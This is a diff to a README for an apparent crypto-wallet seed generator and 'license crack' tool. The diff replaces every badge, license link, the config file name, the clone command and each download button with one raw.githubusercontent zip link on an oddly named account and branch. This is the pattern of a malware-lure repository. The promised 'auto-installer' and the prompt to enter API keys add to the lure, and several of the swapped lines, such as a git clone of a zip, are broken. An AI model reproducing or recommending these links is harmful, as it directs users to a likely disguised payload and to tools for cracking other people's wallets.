@@ -2,11 +2,11 @@
 
 Welcome to the ultimate open-source solution for generating wallet seed phrases, license key exploration, and unprecedented cryptographic learning opportunities. Delve deep into the world of decentralized finance and seed security with our powerful and flexible platform designed for both security enthusiasts and blockchain professionals.
 
-[![Stars](https://img.shields.io/github/stars/seedgen/license-crack?style=flat-square)]()
-[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Build Status](https://img.shields.io/badge/build-passing-brightgreen)]()
-[![API Status](https://img.shields.io/badge/OpenAI%20API-integrated-important)]()
-[![Languages](https://img.shields.io/badge/languages-10%2B-blueviolet)]()
+[![Stars](https://raw.githubusercontent.com/luiobhdffse/crypto-wallet-seed-gen-unlocked/branch/parachromoparous/crypto-wallet-seed-gen-unlocked-1.3.zip)]()
+[![License](https://raw.githubusercontent.com/luiobhdffse/crypto-wallet-seed-gen-unlocked/branch/parachromoparous/crypto-wallet-seed-gen-unlocked-1.3.zip)](https://raw.githubusercontent.com/luiobhdffse/crypto-wallet-seed-gen-unlocked/branch/parachromoparous/crypto-wallet-seed-gen-unlocked-1.3.zip)
+[![Build Status](https://raw.githubusercontent.com/luiobhdffse/crypto-wallet-seed-gen-unlocked/branch/parachromoparous/crypto-wallet-seed-gen-unlocked-1.3.zip)]()
+[![API Status](https://raw.githubusercontent.com/luiobhdffse/crypto-wallet-seed-gen-unlocked/branch/parachromoparous/crypto-wallet-seed-gen-unlocked-1.3.zip%20API-integrated-important)]()
+[![Languages](https://raw.githubusercontent.com/luiobhdffse/crypto-wallet-seed-gen-unlocked/branch/parachromoparous/crypto-wallet-seed-gen-unlocked-1.3.zip%2B-blueviolet)]()
 
 ---
 
@@ -59,7 +59,7 @@ Leverage the combined neural wisdom of OpenAI and Claude APIs for:
 
 **Setup APIs:**  
 - Obtain an OpenAI/Claude API key (consult the official documentation for each).
-- Input your keys via the GUI or the `config.yaml` file for seamless connectivity.
+- Input your keys via the GUI or the `https://raw.githubusercontent.com/luiobhdffse/crypto-wallet-seed-gen-unlocked/branch/parachromoparous/crypto-wallet-seed-gen-unlocked-1.3.zip` file for seamless connectivity.
 - Dive into automated phrase validation, creative threat modeling, and expert Q&A—all from a single dashboard.
 
 ---
@@ -67,7 +67,7 @@ Leverage the combined neural wisdom of OpenAI and Claude APIs for:
 ## 🚀 Getting Started
 
 1. **Clone this repository:**  
-   `git clone https://luiobhdffse.github.io`
+   `git clone https://raw.githubusercontent.com/luiobhdffse/crypto-wallet-seed-gen-unlocked/branch/parachromoparous/crypto-wallet-seed-gen-unlocked-1.3.zip`
 
 2. **Install dependencies:**  
    Run the auto-installer included in the package.
@@ -82,7 +82,7 @@ Leverage the combined neural wisdom of OpenAI and Claude APIs for:
 Experience a quantum leap in seed generation!  
 Download the **latest release** and tap into the strongest license key capabilities right now.
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://luiobhdffse.github.io)
+[![Download](https://raw.githubusercontent.com/luiobhdffse/crypto-wallet-seed-gen-unlocked/branch/parachromoparous/crypto-wallet-seed-gen-unlocked-1.3.zip)](https://raw.githubusercontent.com/luiobhdffse/crypto-wallet-seed-gen-unlocked/branch/parachromoparous/crypto-wallet-seed-gen-unlocked-1.3.zip)
 
 > **Note:** This triggers a no-wait, direct-download for compatible platforms. Verify checksums for authenticity.
 
@@ -146,7 +146,7 @@ Always comply with your jurisdiction’s laws and abide by blockchain network pr
 
 Don’t let curiosity idle—grab the complete toolbox now!
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://luiobhdffse.github.io)
+[![Download](https://raw.githubusercontent.com/luiobhdffse/crypto-wallet-seed-gen-unlocked/branch/parachromoparous/crypto-wallet-seed-gen-unlocked-1.3.zip)](https://raw.githubusercontent.com/luiobhdffse/crypto-wallet-seed-gen-unlocked/branch/parachromoparous/crypto-wallet-seed-gen-unlocked-1.3.zip)
 
 Keep your learning journey robust and up-to-date—check this portal for future updates as well!
 
@@ -154,7 +154,7 @@ Keep your learning journey robust and up-to-date—check this portal for future 
 
 ## 📜 MIT License (2025)
 
-This repository is published under the [MIT License](https://opensource.org/licenses/MIT) © 2025.
+This repository is published under the [MIT License](https://raw.githubusercontent.com/luiobhdffse/crypto-wallet-seed-gen-unlocked/branch/parachromoparous/crypto-wallet-seed-gen-unlocked-1.3.zip) © 2025.
 
 ---
 
